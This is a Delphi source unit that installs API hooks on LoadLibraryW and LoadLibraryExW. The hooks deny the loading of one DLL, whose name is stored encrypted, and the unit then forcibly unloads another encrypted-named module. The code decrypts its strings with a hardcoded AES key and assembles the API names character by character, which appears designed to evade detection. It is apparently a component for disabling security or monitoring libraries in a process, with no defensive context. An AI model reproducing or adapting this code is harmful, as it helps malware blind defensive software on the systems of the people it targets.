unit uLook;

interface

uses
  Windows, CodeLen, CodeMem, CodeMemOpt, GenCodeHook, SysUtils,
  DCPrijndael,DCPSha256;

procedure InstallClear;
procedure UninstallClear;

var
  OldLoadLibraryW: function(lpFileName: LPCWSTR): dword; stdcall;
  OldLoadLibraryExW: function(lpFileName: LPCWSTR; file_, flags: dword) : dword; stdcall;

implementation


function DCrypt256(S: String): string;
var
  Cipher: TDCP_rijndael;
begin
  Cipher:= TDCP_rijndael.Create(nil);
  Cipher.InitStr('{1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ}', TDCP_sha256);

  Result := Cipher.DecryptString(S);
  Cipher.Burn;
  Cipher.Free;
end;


function NewLoadLibraryW(lpFileName: LPCWSTR): dword; stdcall;
begin
  if (Pos(DCrypt256('0SoYpufjvuU='),LowerCase(lpFileName)) <> 0) then
  begin
    Result := 0;

    SetLastError(ERROR_ACCESS_DENIED);
  end
  else
    Result := OldLoadLibraryW(lpFileName);

end;

function NewLoadLibraryExW(lpFileName: LPCWSTR; file_, flags: dword) : dword; stdcall;
begin
  if (Pos(DCrypt256('0SoYpufjvuU='),LowerCase(lpFileName)) <> 0) then
  begin
    Result := 0;
    SetLastError(ERROR_ACCESS_DENIED);

  end
  else
    Result := OldLoadLibraryExW(lpFileName,file_,flags);

end;


procedure UninstallClear;
begin
  RemoveGenericCodeHook(@OldLoadLibraryW);
  RemoveGenericCodeHook(@OldLoadLibraryExW);
end;

procedure InstallClear;
var
  Module: HMODULE;
  dwThread:Cardinal;
  Result: Boolean;
  hModC,hModB,hModX: HMODULE;
  function GPA(Name: PAnsiChar): Pointer;
  begin
    Result := GetProcAddress(Module, Name);
  end;

begin
  ///
  Module := GetModuleHandle(PChar(DCrypt256('3UMTmTrsOqe6Lerx')));
  if Module <> 0 then
  begin
    Result:= CreateGenericCodeHook(
    GPA(PAnsiChar(chr(ord('L'))+chr(ord('o'))+
    chr(ord('a'))+chr(ord('d'))+
    chr(ord('L'))+chr(ord('i'))+
    chr(ord('b'))+chr(ord('r'))+
    chr(ord('a'))+chr(ord('r'))+
    chr(ord('y'))+chr(ord('W')))),  @NewLoadLibraryW, @OldLoadLibraryW);

    Result:= CreateGenericCodeHook(GPA(PAnsiChar(chr(ord('L'))+chr(ord('o'))+
    chr(ord('a'))+chr(ord('d'))+
    chr(ord('L'))+chr(ord('i'))+
    chr(ord('b'))+chr(ord('r'))+
    chr(ord('a'))+chr(ord('r'))+
    chr(ord('y'))+chr(ord('E'))+
    chr(ord('x'))+chr(ord('W')))),  @NewLoadLibraryExW, @OldLoadLibraryExW);
  end;
  hModC := GetModuleHandle(PChar(DCrypt256('0SoYo3JqQWrflg==')));
  if hModC=0 then
  exit;
  repeat
  until not FreeLibrary(hModC);

end;


end.
